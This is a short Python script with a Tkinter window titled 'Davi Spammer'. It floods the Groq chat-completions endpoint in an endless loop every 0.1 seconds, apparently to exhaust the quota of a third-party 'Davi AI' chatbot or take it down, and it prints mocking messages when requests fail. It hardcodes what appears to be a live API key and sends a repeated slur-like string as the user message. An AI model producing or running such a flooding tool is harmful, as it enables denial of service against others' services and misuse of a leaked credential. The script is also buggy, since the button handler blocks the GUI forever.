import httpx
import tkinter, time
print("Welcome to status console")
print("Davi ai: https://zarabatana.rf.gd/")

url = "https://api.groq.com/openai/v1/chat/completions"

headers = {
    "Authorization": "Bearer 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",
    "Content-Type": "application/json"
}
data = {
    "model": "llama-3.1-8b-instant",
    "messages": [
        {
            "role": "system",
            "content": "Você é a Davi AI, uma IA amigável e direta."
        },
        {
            "role": "user",
            "content": "gaygaygaygaygaygaygaygaygaygay"
        }
    ]
}

def spamm():
    while True:
        time.sleep(0.1)
        response = httpx.post(url, json=data, headers=headers)
        status = response.status_code
        if status == 200:
            statusbutton.config(text=f"Spammando... {status}")
            print("IA nao caiu! Espere um tempo")
        else:
            statusbutton.config(text=f"Erro no spamm... {status}")
            print("IA caiu haha!")


def click():
    status = spamm()
    statusbutton.config(text=f"Spammando... {status}")
    spamm()

janela = tkinter.Tk()
janela.title("Davi Spammer")
janela.geometry("150x150")
label = tkinter.Label(janela, text="Davi Spammer")
label.pack()
button = tkinter.Button(janela, text="Spamm", command=click)
button.pack()
statusbutton = tkinter.Label(janela, text="")
statusbutton.pack()

janela.mainloop()
